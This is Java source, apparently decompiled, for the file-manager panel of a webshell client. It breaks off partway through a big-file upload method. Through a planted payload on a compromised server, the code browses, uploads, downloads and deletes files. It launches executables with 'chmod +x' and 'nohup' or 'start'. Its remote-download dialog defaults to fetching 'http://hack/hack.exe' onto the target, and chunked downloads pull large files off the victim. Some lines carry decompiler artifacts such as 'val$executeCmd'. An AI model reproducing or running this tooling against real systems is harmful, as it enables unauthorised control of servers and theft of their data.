package core.ui.component;
import core.ApplicationContext;
import core.Db;
import core.EasyI18N;
import core.Encoding;
import core.shell.ShellEntity;
import core.ui.component.annotation.ButtonToMenuItem;
import core.ui.component.dialog.FileDialog;
import core.ui.component.dialog.GFileChooser;
import core.ui.component.dialog.GOptionPane;
import core.ui.component.dialog.HttpProgressBar;
import core.ui.component.model.FileInfo;
import core.ui.component.model.FileOpertionInfo;
import java.awt.BorderLayout;
import java.awt.CardLayout;
import java.awt.Component;
import java.awt.Frame;
import java.awt.datatransfer.DataFlavor;
import java.awt.datatransfer.Transferable;
import java.awt.event.ActionEvent;
import java.awt.event.KeyEvent;
import java.awt.event.MouseEvent;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.List;
import java.util.Vector;
import javax.swing.ImageIcon;
import javax.swing.JButton;
import javax.swing.JComponent;
import javax.swing.JFrame;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JSplitPane;
import util.Log;
import util.UiFunction;
import util.functions;

@DisplayName(DisplayName = "文件管理")
public class ShellFileManager extends JPanel {
  public static final ThreadLocal<Boolean> bigFileThreadLocal = new ThreadLocal<>();
  
  private JScrollPane filelJscrollPane;
  
  private DataTree fileDataTree;
  private JPanel filePanel;
  private JPanel fileOpertionPanel;
  private DefaultMutableTreeNode rootTreeNode;
  private JScrollPane dataViewSplitPane;
  private JScrollPane toolSplitPane;
  private DataView dataView;
  private ShellRSFilePanel rsFilePanel;
  private JPanel dataViewPanel;
  private JPanel toolsPanel;
  @ButtonToMenuItem
  private JButton editFileButton;
  @ButtonToMenuItem
  private JButton editFileNewWindowButton;
  @ButtonToMenuItem
  private JButton editFileInEditFileFrameButton;
  @ButtonToMenuItem
  private JButton showImageFileButton;
  @ButtonToMenuItem
  private JButton uploadButton;
  @ButtonToMenuItem
  private JButton moveButton;
  @ButtonToMenuItem
  private JButton copyFileButton;
  @ButtonToMenuItem
  private JButton copyNameButton;
  @ButtonToMenuItem
  private JButton deleteFileButton;
  @ButtonToMenuItem
  private JButton newFileButton;
  @ButtonToMenuItem
  private JButton newDirButton;
  @ButtonToMenuItem
  private JButton executeFileButton;
  @ButtonToMenuItem
  private JButton refreshButton;
  @ButtonToMenuItem
  private JButton downloadButton;
  @ButtonToMenuItem
  private JButton fileAttrButton;
  @ButtonToMenuItem
  private JButton fileRemoteDownButton;
  @ButtonToMenuItem
  private JButton bigFileDownloadButton;
  @ButtonToMenuItem
  private JButton bigFileUploadButton;
  private JTextField dirField;
  private JPanel dirPanel;
  private JSplitPane jSplitPane1;
  private JSplitPane jSplitPane2;
  private JSplitPane jSplitPane3;
  private Vector<String> dateViewColumnVector;
  private ImageIcon dirIcon;
  private ImageIcon fileIcon;
  private String currentDir;
  private final ShellEntity shellEntity;
  private final Payload payload;
  private final Encoding encoding;
  
  public ShellFileManager(ShellEntity entity) {
    this.shellEntity = entity;
    this.payload = this.shellEntity.getPayloadModule();
    this.encoding = Encoding.getEncoding(this.shellEntity);
    setLayout(new BorderLayout(1, 1));
    InitJPanel();
    InitEvent();
    updateUI();
    init(this.shellEntity);
    EasyI18N.installObject(this.dataView);
  }
  
  public void init(ShellEntity shellEntity) {
    String[] fileRoot = this.payload.listFileRoot();
    for (int i = 0; i < fileRoot.length; i++) {
      this.fileDataTree.AddNote(fileRoot[i]);
    }
    this.currentDir = functions.formatDir(this.payload.currentDir());
    this.currentDir = this.currentDir.substring(0, 1).toUpperCase() + this.currentDir.substring(1);
    this.dirField.setText(this.currentDir);
    this.fileDataTree.AddNote(this.currentDir);
  }

  
  private void InitJPanel() {
    this.filePanel = new JPanel();
    this.filePanel.setLayout(new BorderLayout(1, 1));
    this.filelJscrollPane = new JScrollPane();
    this.rootTreeNode = new DefaultMutableTreeNode("Disk");
    this.fileDataTree = new DataTree("", this.rootTreeNode);
    this.fileDataTree.setRootVisible(true);
    this.filelJscrollPane.setViewportView(this.fileDataTree);
    this.filePanel.add(this.filelJscrollPane);
    this.fileOpertionPanel = new JPanel(new CardLayout());
    
    this.dateViewColumnVector = new Vector<>();
    this.dateViewColumnVector.add("icon");
    this.dateViewColumnVector.add("name");
    this.dateViewColumnVector.add("type");
    this.dateViewColumnVector.add("lastModified");
    this.dateViewColumnVector.add("size");
    this.dateViewColumnVector.add("permission");
    this.dataViewSplitPane = new JScrollPane();
    this.dataViewPanel = new JPanel();
    this.dataViewPanel.setLayout(new BorderLayout(1, 1));
    this.dataView = new DataView(null, this.dateViewColumnVector, 0, 30);
    this.dataViewSplitPane.setViewportView(this.dataView);
    this.fileOpertionPanel.add("dataView", this.dataViewSplitPane);
    this.rsFilePanel = new ShellRSFilePanel(this.shellEntity, this.fileOpertionPanel, "dataView");
    this.fileOpertionPanel.add("rsFile", this.rsFilePanel);
    this.dataViewPanel.add(this.fileOpertionPanel);
    
    this.toolSplitPane = new JScrollPane();
    this.toolsPanel = new JPanel();
    this.editFileButton = new JButton("在当前窗口编辑文件");
    this.editFileNewWindowButton = new JButton("在新窗口编辑文件");
    this.editFileInEditFileFrameButton = new JButton("在编辑器编辑此文件");
    this.showImageFileButton = new JButton("在新窗口显示图片");
    this.uploadButton = new JButton("上传");
    this.refreshButton = new JButton("刷新");
    this.moveButton = new JButton("移动");
    
    this.copyFileButton = new JButton("复制");
    this.downloadButton = new JButton("下载");
    this.copyNameButton = new JButton("复制绝对路径");
    this.deleteFileButton = new JButton("删除文件");
    this.newFileButton = new JButton("新建文件");
    this.newDirButton = new JButton("新建文件夹");
    this.fileAttrButton = new JButton("文件属性");
    this.fileRemoteDownButton = new JButton("远程下载");
    this.executeFileButton = new JButton("执行");
    this.bigFileDownloadButton = new JButton("大文件下载");
    this.bigFileUploadButton = new JButton("大文件上传");
    this.toolsPanel.add(this.uploadButton);
    this.toolsPanel.add(this.moveButton);
    
    this.toolsPanel.add(this.refreshButton);
    this.toolsPanel.add(this.copyFileButton);
    this.toolsPanel.add(this.copyNameButton);
    this.toolsPanel.add(this.deleteFileButton);
    this.toolsPanel.add(this.newFileButton);
    this.toolsPanel.add(this.newDirButton);
    this.toolsPanel.add(this.downloadButton);
    this.toolsPanel.add(this.fileAttrButton);
    this.toolsPanel.add(this.fileRemoteDownButton);
    this.toolsPanel.add(this.executeFileButton);
    this.toolsPanel.add(this.bigFileUploadButton);
    this.toolsPanel.add(this.bigFileDownloadButton);
    this.toolSplitPane.setViewportView(this.toolsPanel);
    
    this.dirPanel = new JPanel();
    this.dirPanel.setLayout(new BorderLayout(1, 1));
    this.dirField = new JTextField();
    this.dirField.setColumns(100);
    this.dirPanel.add(this.dirField);
    
    this.dirIcon = new ImageIcon(getClass().getResource("/images/folder.png"));
    this.fileIcon = new ImageIcon(getClass().getResource("/images/file.png"));

    
    this.fileDataTree.setLeafIcon(new ImageIcon(getClass().getResource("/images/folder.png")));
    this.jSplitPane2 = new JSplitPane();
    this.jSplitPane2.setOrientation(0);
    this.jSplitPane2.setTopComponent(this.dataViewPanel);
    this.jSplitPane2.setBottomComponent(this.toolSplitPane);
    this.jSplitPane3 = new JSplitPane();
    this.jSplitPane3.setOrientation(0);
    this.jSplitPane3.setTopComponent(this.dirPanel);
    this.jSplitPane3.setBottomComponent(this.jSplitPane2);
    this.jSplitPane1 = new JSplitPane();
    this.jSplitPane1.setOrientation(1);
    this.jSplitPane1.setLeftComponent(this.filePanel);
    this.jSplitPane1.setRightComponent(this.jSplitPane3);
    
    add(this.jSplitPane1);
  }
  
  private void InitEvent() {
    automaticBindClick.bindJButtonClick(this, this);
    automaticBindClick.bindButtonToMenuItem(this, this, this.dataView.getRightClickMenu());
    this.dataView.setActionDblClick(e -> dataViewDbClick(e));

    
    this.fileDataTree.setActionDbclick(e -> fileDataTreeDbClick(e));

    
    this.dirField.addKeyListener(new KeyAdapter()
        {
          public void keyPressed(KeyEvent e) {
            if (e.getKeyChar() == '\n')
            {
              ShellFileManager.this.refreshButtonClick((ActionEvent)null);
            }
          }
        });
    this.jSplitPane2.setTransferHandler(new TransferHandler()
        {
          private static final long serialVersionUID = 1L;
          
          public boolean importData(JComponent comp, Transferable t) {
            try {
              Object o = t.getTransferData(DataFlavor.javaFileListFlavor);
              
              if (List.class.isAssignableFrom(o.getClass())) {
                List list = (List)o;
                if (list.size() == 1) {
                  Object fileObject = list.get(0);
                  if (File.class.isAssignableFrom(fileObject.getClass())) {
                    File file = (File)fileObject;
                    if (file.canRead() && file.isFile()) {
                      String uploadFileString = ShellFileManager.this.currentDir + file.getName();
                      ShellFileManager.this.uploadFile(uploadFileString, file, false);
                    } else {
                      GOptionPane.showMessageDialog(null, "目标不是文件 或不可读");
                    } 
                  } else {
                    GOptionPane.showMessageDialog(null, "目标不是文件");
                  } 
                } else {
                  GOptionPane.showMessageDialog(null, "不支持多文件操作");
                } 
              } else {
                
                GOptionPane.showMessageDialog(null, "不支持的操作");
              } 
              
              return true;
            } catch (Exception e) {
              GOptionPane.showMessageDialog((Component)ShellFileManager.this.shellEntity.getFrame(), e.getMessage(), "提示", 1);
              Log.error(e);
              
              return false;
            } 
          }
          
          public boolean canImport(JComponent comp, DataFlavor[] flavors) {
            for (int i = 0; i < flavors.length; i++) {
              if (DataFlavor.javaFileListFlavor.equals(flavors[i])) {
                return true;
              }
            } 
            return false;
          }
        });
  }
  public void dataViewDbClick(MouseEvent e) {
    editFileInEditFileFrameButtonClick((ActionEvent)null);
  }
  public void editFileNewWindowButtonClick(ActionEvent e) {
    Vector<String> rowVector = this.dataView.GetSelectRow();
    String fileType = rowVector.get(2);
    String fileNameString = functions.formatDir(this.currentDir) + rowVector.get(1);
    long fileSize = ((FileInfo)rowVector.get(4)).getSize();
    if (fileType.equals("file")) {
      ShellRSFilePanel shellRSFilePanel = new ShellRSFilePanel(this.shellEntity, null, "editFileNewWindow");
      JFrame frame = new JFrame("editFile");
      frame.add(shellRSFilePanel);
      shellRSFilePanel.rsFile(fileNameString);
      functions.setWindowSize(frame, 700, 800);
      frame.setLocationRelativeTo((Component)null);
      frame.setVisible(true);
      frame.setDefaultCloseOperation(2);
    } else {
      GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "目标是文件夹", "警告", 2);
    } 
  }
  public void editFileButtonClick(ActionEvent e) {
    Vector<String> rowVector = this.dataView.GetSelectRow();
    String fileType = rowVector.get(2);
    String fileNameString = functions.formatDir(this.currentDir) + rowVector.get(1);
    long fileSize = ((FileInfo)rowVector.get(4)).getSize();
    if (fileType.equals("dir")) {
      refreshFile(this.dirField.getText() + "/" + rowVector.get(1));
    }
    else if (fileSize < 1048576L) {
      this.rsFilePanel.rsFile(fileNameString);
      ((CardLayout)this.fileOpertionPanel.getLayout()).show(this.fileOpertionPanel, "rsFile");
    } else {
      GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "目标文件大小大于1MB", "提示", 2);
    } 
  }

  
  public void editFileInEditFileFrameButtonClick(ActionEvent e) {
    Vector<String> rowVector = this.dataView.GetSelectRow();
    String fileType = rowVector.get(2);
    String fileNameString = functions.formatDir(this.currentDir) + rowVector.get(1);
    long fileSize = ((FileInfo)rowVector.get(4)).getSize();
    if (fileType.equals("file")) {
      ShellRSFilePanel shellRSFilePanel = new ShellRSFilePanel(this.shellEntity, null, "editFileNewWindow");
      shellRSFilePanel.rsFile(fileNameString);
      EditFileFrame.OpenNewEdit(shellRSFilePanel);
    } else {
      refreshFile(this.dirField.getText() + "/" + rowVector.get(1));
    } 
  }
  
  public void showImageFileButtonClick(ActionEvent e) {
    Vector<String> rowVector = this.dataView.GetSelectRow();
    String fileType = rowVector.get(2);
    String fileNameString = functions.formatDir(this.currentDir) + rowVector.get(1);
    long fileSize = ((FileInfo)rowVector.get(4)).getSize();
    if (fileType.equals("dir")) {
      GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "目标是文件夹", "警告", 2);
    }
    else if (fileSize < 3145728L) {
      byte[] fileContent = null;
      try {
        fileContent = this.payload.downloadFile(fileNameString);
        ImageShowFrame.showImageDiaolog(new ImageIcon(ImageIO.read(new ByteArrayInputStream(fileContent))));
      } catch (Exception err) {
        Log.error(err);
        GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "下载文件失败", "警告", 0);
      } 
    } else {
      GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "目标文件大小大于3MB", "提示", 2);
    } 
  }

  
  public void fileDataTreeDbClick(MouseEvent e) {
    refreshFile(this.fileDataTree.GetSelectFile());
  }
  
  public void moveButtonClick(ActionEvent e) {
    String fileString = getSelectdFile();
    FileOpertionInfo fileOpertionInfo = FileDialog.showFileOpertion((Frame)this.shellEntity.getFrame(), "reName", fileString, fileString);
    
    if (fileOpertionInfo.getOpertionStatus().booleanValue() && fileOpertionInfo.getSrcFileName().trim().length() > 0 && fileOpertionInfo
      .getDestFileName().trim().length() > 0) {
      String srcFileString = fileOpertionInfo.getSrcFileName();
      String destFileString = fileOpertionInfo.getDestFileName();
      boolean state = this.payload.moveFile(srcFileString, destFileString);
      if (state) {
        GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), String.format(EasyI18N.getI18nString("移动成功  %s >> %s"), new Object[] { fileOpertionInfo.getSrcFileName(), fileOpertionInfo
                .getDestFileName() }), "提示", 1);
      } else {
        GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "修改失败", "提示", 2);
      } 
    } else {
      GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "信息填写不完整", "提示", 2);
    } 
  }
  
  public void copyFileButtonClick(ActionEvent e) {
    String fileString = getSelectdFile();
    FileOpertionInfo fileOpertionInfo = FileDialog.showFileOpertion((Frame)this.shellEntity.getFrame(), "copy", fileString, fileString);
    
    if (fileOpertionInfo.getOpertionStatus().booleanValue() && fileOpertionInfo.getSrcFileName().trim().length() > 0 && fileOpertionInfo
      .getDestFileName().trim().length() > 0) {
      boolean state = this.payload.copyFile(fileOpertionInfo.getSrcFileName(), fileOpertionInfo.getDestFileName());
      if (state) {
        GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), String.format(EasyI18N.getI18nString("复制成功  %s <<>> %s"), new Object[] { fileOpertionInfo.getSrcFileName(), fileOpertionInfo
                .getDestFileName() }), "提示", 1);
      } else {
        GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "复制失败", "提示", 2);
      } 
    } else {
      GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "信息填写不完整", "提示", 2);
    } 
  }

  
  public void copyNameButtonClick(ActionEvent e) {
    Vector<String> vector = this.dataView.GetSelectRow();
    if (vector != null) {
      String fileString = functions.formatDir(this.currentDir) + vector.get(1);
      Toolkit.getDefaultToolkit().getSystemClipboard().setContents(new StringSelection(fileString), null);
      GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "已经复制到剪辑版");
    } 
  }

  
  public void deleteFileButtonClick(ActionEvent e) {
    String fileString = getSelectdFile();
    String inputFile = GOptionPane.showInputDialog("输入文件名称", fileString);
    if (inputFile != null) {
      boolean state = this.payload.deleteFile(inputFile);
      if (state) {
        GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "删除成功", "提示", 1);
      } else {
        GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "删除失败", "提示", 2);
      } 
    } else {
      Log.log("用户取消选择.....", new Object[0]);
    } 
  }

  
  private String getSelectdFile() {
    String fileString = "";
    try {
      fileString = functions.formatDir(this.currentDir) + this.dataView.getValueAt(this.dataView.getSelectedRow(), 1);
    } catch (Exception exception) {}

    
    return fileString;
  }
  
  public void newFileButtonClick(ActionEvent e) {
    String fileString = functions.formatDir(this.currentDir) + "newFile";
    String inputFile = GOptionPane.showInputDialog("输入文件名称", fileString);
    if (inputFile != null) {
      boolean state = this.payload.newFile(inputFile);
      if (state) {
        GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "新建文件成功", "提示", 1);
      } else {
        GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "新建文件失败", "提示", 2);
      } 
    } else {
      Log.log("用户取消选择.....", new Object[0]);
    } 
  }
  
  public void uploadButtonClick(ActionEvent e) {
    (new Thread(new Runnable()
        {
          public void run()
          {
            ApplicationContext.isShowHttpProgressBar.set(new Boolean(true));
            if (ApplicationContext.isGodMode()) {
              ShellFileManager.this.GUploadFile(false);
            } else {
              ShellFileManager.this.UploadFile(false);
            } 
          }
        })).start();
  }
  
  public void bigFileUploadButtonClick(ActionEvent e) {
    (new Thread(new Runnable()
        {
          public void run()
          {
            if (ApplicationContext.isGodMode()) {
              ShellFileManager.this.GUploadFile(true);
            } else {
              ShellFileManager.this.UploadFile(true);
            } 
          }
        })).start();
  }

  
  public void refreshButtonClick(ActionEvent e) {
    refreshFile(functions.formatDir(this.dirField.getText()));
  }
  
  public void executeFileButtonClick(ActionEvent e) {
    String fileString = getSelectdFile();
    String inputFile = GOptionPane.showInputDialog("输入可执行文件名称", fileString);
    if (inputFile != null) {
      
      String cmdString = null;
      if (!this.payload.isWindows()) {
        cmdString = String.format("chmod +x %s && nohup %s > /dev/null", new Object[] { inputFile, inputFile });
      } else {
        cmdString = String.format("start %s ", new Object[] { inputFile });
      } 
      
      final String executeCmd = cmdString;
      (new Thread(new Runnable()
          {
            public void run()
            {
              Log.log(String.format("Execute Command Start As %s", new Object[] { this.val$executeCmd }), new Object[0]);
              String result = ShellFileManager.this.payload.execCommand(executeCmd);
              Log.log(String.format("execute Command End %s", new Object[] { result }), new Object[0]);
            }
          })).start();
    } else {
      
      Log.log("用户取消选择.....", new Object[0]);
    } 
  }

  
  public void downloadButtonClick(ActionEvent e) {
    (new Thread(new Runnable()
        {
          public void run()
          {
            ApplicationContext.isShowHttpProgressBar.set(new Boolean(true));
            if (ApplicationContext.isGodMode()) {
              ShellFileManager.this.GDownloadFile(false);
            } else {
              ShellFileManager.this.downloadFile(false);
            } 
          }
        })).start();
  }


  
  public void bigFileDownloadButtonClick(ActionEvent e) {
    (new Thread(new Runnable()
        {
          public void run()
          {
            if (ApplicationContext.isGodMode()) {
              ShellFileManager.this.GDownloadFile(true);
            } else {
              ShellFileManager.this.downloadFile(true);
            } 
          }
        })).start();
  }


  
  public void newDirButtonClick(ActionEvent e) {
    String fileString = functions.formatDir(this.currentDir) + "newDir";
    String inputFile = GOptionPane.showInputDialog("输入文件夹名称", fileString);
    if (inputFile != null) {
      boolean state = this.payload.newDir(inputFile);
      if (state) {
        GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "新建文件夹成功", "提示", 1);
      } else {
        GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "新建文件夹失败", "提示", 2);
      } 
    } else {
      Log.log("用户取消选择.....", new Object[0]);
    } 
  }

  
  public void fileAttrButtonClick(ActionEvent e) {
    String fileString = getSelectdFile();
    String filePermission = (String)this.dataView.getValueAt(this.dataView.getSelectedRow(), 5);
    String fileTime = (String)this.dataView.getValueAt(this.dataView.getSelectedRow(), 3);
    FileAttr attr = new FileAttr(this.shellEntity, fileString, filePermission, fileTime);
  }
  
  public void fileRemoteDownButtonClick(ActionEvent e) {
    final FileOpertionInfo fileOpertionInfo = FileDialog.showFileOpertion((Frame)this.shellEntity.getFrame(), "fileRemoteDown", "http://hack/hack.exe", this.currentDir + "hack.exe");
    
    if (fileOpertionInfo.getOpertionStatus().booleanValue()) {
      (new Thread(new Runnable()
          {
            public void run()
            {
              boolean state = ShellFileManager.this.payload.fileRemoteDown(fileOpertionInfo.getSrcFileName(), fileOpertionInfo
                  .getDestFileName());
              if (state) {
                GOptionPane.showMessageDialog((Component)ShellFileManager.this.shellEntity.getFrame(), "远程下载成功", "提示", 1);
              } else {
                
                GOptionPane.showMessageDialog((Component)ShellFileManager.this.shellEntity.getFrame(), "远程下载失败", "提示", 2);
              }
            
            }
          })).start();
    }
  }
  
  private Vector<Vector<Object>> getAllFile(String filePathString) {
    filePathString = functions.formatDir(filePathString);
    String fileDataString = this.payload.getFile(filePathString);
    String[] rowStrings = fileDataString.split("\n");
    
    Vector<Vector<Object>> rows = new Vector<>();
    
    if (rowStrings[0].equals("ok")) {
      rows = new Vector<>();
      this.fileDataTree.AddNote(rowStrings[1]);
      this.currentDir = functions.formatDir(rowStrings[1]);
      this.dirField.setText(functions.formatDir(rowStrings[1]));
      for (int i = 2; i < rowStrings.length; i++) {
        String[] fileTypes = rowStrings[i].split("\t");
        Vector<Object> row = new Vector();
        if (fileTypes.length == 5) {
          if (fileTypes[1].equals("0")) {
            row.add(this.dirIcon);
            this.fileDataTree.AddNote(this.currentDir + fileTypes[0]);
          } else {
            row.add(this.fileIcon);
          } 
          row.add(fileTypes[0]);
          row.add(fileTypes[1].equals("0") ? "dir" : "file");
          row.add(fileTypes[2]);
          row.add(new FileInfo(fileTypes[3]));
          row.add(fileTypes[4]);
          rows.add(row);
        } else {
          Log.error("格式不匹配 ," + rowStrings[i]);
        } 
      } 
    } else {
      Log.error(fileDataString);
      Log.error("目标返回异常,无法正常格式化数据!");
      GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), fileDataString);
    } 
    return rows;
  }
  
  private synchronized void refreshFile(String filePathString) {
    Vector<Vector<Object>> rowsVector = getAllFile(filePathString);
    this.dataView.AddRows(rowsVector);
    this.dataView.getColumnModel().getColumn(0).setMaxWidth(35);
    this.dataView.getModel().fireTableDataChanged();
  }

  
  private void GUploadFile(boolean bigFileUpload) {
    FileOpertionInfo fileOpertionInfo = FileDialog.showFileOpertion((Frame)this.shellEntity.getFrame(), "upload", "", "");
    if (fileOpertionInfo.getOpertionStatus().booleanValue() && fileOpertionInfo.getSrcFileName().trim().length() > 0 && fileOpertionInfo
      .getDestFileName().trim().length() > 0) {
      if (fileOpertionInfo.getDestFileName().length() > 0) {
        uploadFile(fileOpertionInfo.getDestFileName(), new File(fileOpertionInfo.getSrcFileName()), bigFileUpload);
      } else {
        GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "上传路径为空", "提示", 2);
      } 
    } else {
      GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "信息填写不完整", "提示", 2);
    } 
  }
  
  private void UploadFile(boolean bigFileUpload) {
    GFileChooser chooser = new GFileChooser();
    chooser.setFileSelectionMode(0);
    boolean flag = (0 == chooser.showDialog(new JLabel(), "选择"));
    File selectdFile = chooser.getSelectedFile();
    if (flag && selectdFile != null) {
      String uploadFileString = this.currentDir + selectdFile.getName();
      uploadFile(uploadFileString, selectdFile, bigFileUpload);
    } else {
      
      GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "信息填写不完整", "提示", 2);
    } 
  }
  
  public void uploadFile(String uploadFileString, File selectdFile, boolean bigFileUpload) {
    byte[] data = new byte[0];
    Log.log(String.format("%s starting %s -> %s\t threadId: %s", new Object[] { "upload", selectdFile, uploadFileString, Long.valueOf(Thread.currentThread().getId()) }), new Object[0]);
    boolean state = false;
    if (bigFileUpload) {
      state = uploadBigFile(uploadFileString, selectdFile);
    } else {
      try {
        FileInputStream fileInputStream = new FileInputStream(selectdFile);
        data = functions.readInputStream(fileInputStream);
        fileInputStream.close();
      } catch (FileNotFoundException e1) {
        Log.error(e1);
        GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "文件不存在", "提示", 2);
      } catch (IOException e1) {
        Log.error(e1);
        GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), e1.getMessage(), "提示", 2);
      } 
      state = this.payload.uploadFile(uploadFileString, data);
    } 
    if (state) {
      GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "上传成功", "提示", 1);
    } else {
      GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "上传失败", "提示", 2);
    } 
    Log.log(String.format("%s finish \t threadId: %s", new Object[] { "upload", Long.valueOf(Thread.currentThread().getId()) }), new Object[0]);
  }
  private void GDownloadFile(boolean bigFileDownload) {
    String file = getSelectdFile();
    FileOpertionInfo fileOpertionInfo = FileDialog.showFileOpertion((Frame)this.shellEntity.getFrame(), "download", file, "");
    if (fileOpertionInfo.getOpertionStatus().booleanValue() && fileOpertionInfo.getSrcFileName().trim().length() > 0 && fileOpertionInfo
      .getDestFileName().trim().length() > 0) {
      if (fileOpertionInfo.getDestFileName().length() > 0) {
        downloadFile(fileOpertionInfo.getSrcFileName(), new File(fileOpertionInfo.getDestFileName()), bigFileDownload);
      } else {
        GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "下载路径为空", "提示", 2);
      } 
    } else {
      GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "信息填写不完整", "提示", 2);
    } 
  }
  
  private void downloadFile(boolean bigFileDownload) {
    GFileChooser chooser = new GFileChooser();
    chooser.setFileSelectionMode(0);
    boolean flag = (0 == chooser.showDialog(new JLabel(), "选择"));
    File selectdFile = chooser.getSelectedFile();
    String srcFile = getSelectdFile();
    if (flag && srcFile != null && srcFile.trim().length() > 0) {
      if (selectdFile != null) {
        downloadFile(srcFile, selectdFile, bigFileDownload);
      } else {
        GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "信息填写不完整", "提示", 2);
      } 
    } else {
      GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "未选中下载文件", "提示", 2);
    } 
  }
  private void downloadFile(String srcFileString, File destFile, boolean bigFileDownload) {
    byte[] data = new byte[0];
    Log.log(String.format("%s starting %s -> %s\t threadId: %s", new Object[] { "download", srcFileString, destFile, Long.valueOf(Thread.currentThread().getId()) }), new Object[0]);
    boolean state = false;
    if (bigFileDownload) {
      state = downloadBigFile(srcFileString, destFile);
    } else {
      data = this.payload.downloadFile(srcFileString);
      state = functions.filePutContent(destFile, data);
    } 
    if (state) {
      GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "下载成功", "提示", 1);
    } else {
      GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "下载失败", "提示", 2);
    } 
    Log.log(String.format("%s finish \t threadId: %s", new Object[] { "download", Long.valueOf(Thread.currentThread().getId()) }), new Object[0]);
  }
  private boolean downloadBigFile(String srcFileString, File destFile) {
    int bigFileErrorRetryNum = Db.getSetingIntValue("bigFileErrorRetryNum", 5);
    int bigFileSendRequestSleep = Db.getSetingIntValue("bigFileSendRequestSleep", 521);
    int oneceBigFileDownloadByteNum = Db.getSetingIntValue("oneceBigFileDownloadByteNum", 1048576);
    ApplicationContext.isShowHttpProgressBar.set(Boolean.valueOf(false));
    int cuurentOffset = 0;
    int errorNum = 0;
    try {
      int fileSize = this.payload.getFileSize(srcFileString);
      if (fileSize != -1) {
        
        FileOutputStream fileOutputStream = new FileOutputStream(destFile);
        HttpProgressBar httpProgressBar = new HttpProgressBar(String.format(EasyI18N.getI18nString("大文件下载开始 文件名:%s"), new Object[] { srcFileString }), fileSize);
        label27: while (cuurentOffset < fileSize) {
          while (true) {
            try {
              if (errorNum < bigFileErrorRetryNum) {
                if (httpProgressBar.isClose()) {
                  Log.log(String.format("大文件上传结束 文件大小:%d 上传大小:%d", new Object[] { Integer.valueOf(fileSize), Integer.valueOf(cuurentOffset) }), new Object[0]);
                  fileOutputStream.close();
                  GOptionPane.showMessageDialog((Component)this.shellEntity.getFrame(), "已强制关闭", "提示", 0);
                  httpProgressBar.close();
                  return false;
                } 
                Thread.sleep(bigFileSendRequestSleep);
                byte[] result = this.payload.bigFileDownload(srcFileString, cuurentOffset, oneceBigFileDownloadByteNum);
                if (result.length == oneceBigFileDownloadByteNum || result.length + cuurentOffset == fileSize) {
                  cuurentOffset += result.length;
                  fileOutputStream.write(result);
                  httpProgressBar.setValue(cuurentOffset);
                  continue label27;
                } 
                fileOutputStream.write(result);
                Log.error(new String(result));
                GOptionPane.showMessageDialog((Component)this.shellEntity.getFrame(), new String(result), "错误提示", 0);
                fileOutputStream.close();
                httpProgressBar.close();
                return false;
              } 
              
              Log.log(String.format("大文件下载结束 文件大小:%d 下载大小:%d", new Object[] { Integer.valueOf(fileSize), Integer.valueOf(cuurentOffset) }), new Object[0]);
              httpProgressBar.close();
              GOptionPane.showMessageDialog((Component)this.shellEntity.getFrame(), "错误次数超限", "提示", 0);
              fileOutputStream.close();
              return false;
            }
            catch (Exception e) {
              errorNum++;
              Log.error(e);
              Thread.sleep(500L);
            } 
          } 
        } 
        fileOutputStream.close();
        Log.log("大文件下载结束 src:%s dest:%s 文件大小:%d 下载大小:%d", new Object[] { srcFileString, destFile.getAbsolutePath(), Integer.valueOf(fileSize), Integer.valueOf(cuurentOffset) });
        httpProgressBar.close();
        return true;
      } 
      GOptionPane.showMessageDialog((Component)this.shellEntity.getFrame(), "大文件下载失败 文件不存在或者无法访问", "提示", 0);
      Log.error("大文件下载失败 文件不存在或者无法访问");
    }
    catch (Exception e) {
      Log.error(e);
      GOptionPane.showMessageDialog((Component)this.shellEntity.getFrame(), e.getMessage(), "错误提示", 0);
    } 
    return false;
  }
  
  public boolean uploadBigFile(String uploadFileString, File selectdFile) {
    int bigFileSendRequestSleep = Db.getSetingIntValue("bigFileSendRequestSleep", 521);
    int bigFileErrorRetryNum = Db.getSetingIntValue("bigFileErrorRetryNum", 5);
    int oneceBigFileUploadByteNum = Db.getSetingIntValue("oneceBigFileUploadByteNum", 1048576);
    ApplicationContext.isShowHttpProgressBar.set(Boolean.valueOf(false));
    try {
      FileInputStream fileInputStream = new FileInputStream(selectdFile);
      int fileSize = (int)selectdFile.length();
      byte[] readData = new byte[oneceBigFileUploadByteNum];
      byte[] result = new byte[0];
      int cuurentOffset = 0;
      int readLen = 0;
      HttpProgressBar httpProgressBar = new HttpProgressBar(String.format(EasyI18N.getI18nString("大文件上传开始 文件名:%s"), new Object[] { selectdFile.getAbsolutePath() }), fileSize);
      int errorNum = 0;
      
